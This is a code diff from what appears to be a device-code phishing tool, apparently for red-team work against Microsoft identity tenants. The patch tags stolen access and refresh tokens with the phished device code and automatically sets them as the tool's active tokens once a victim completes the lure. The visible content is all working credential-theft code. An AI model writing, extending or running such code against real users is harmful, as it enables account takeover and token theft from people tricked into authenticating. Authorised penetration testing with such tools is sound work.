@@ -127,9 +127,12 @@ def poll(app) -> None:
                     continue
                 access_token = response.json()["access_token"]
                 user_code = row["user_code"]
+                device_code_id = row["id"]
                 logger.debug(f"Device code phishing successful for code '{user_code}'")
                 access_token_id = save_access_token(
-                    access_token, f"Created using device code auth ({row['user_code']})"
+                    access_token,
+                    f"Created using device code auth ({row['user_code']})",
+                    captured_from_device_code=device_code_id,
                 )
                 decoded = jwt.decode(access_token, options={"verify_signature": False})
                 idtyp = decoded.get("idtyp")
@@ -151,6 +154,20 @@ def poll(app) -> None:
                     response.json().get("resource", "unknown"),
                     int(response.json()["foci"]) if "foci" in response.json() else 0,
                     row["client_id"],
+                    captured_from_device_code=device_code_id,
+                )
+
+                # Auto-set captured tokens as active
+                connection.execute_db(
+                    "INSERT OR REPLACE INTO settings (setting, value) VALUES ('active_access_token_id', ?)",
+                    (str(access_token_id),),
+                )
+                connection.execute_db(
+                    "INSERT OR REPLACE INTO settings (setting, value) VALUES ('active_refresh_token_id', ?)",
+                    (str(refresh_token_id),),
+                )
+                logger.info(
+                    f"Auto-activated tokens for user '{user}': AT={access_token_id}, RT={refresh_token_id}"
                 )
                 if row.get("auto_action") in ["device_prt", "winhello"]:
                     connection.execute_db(
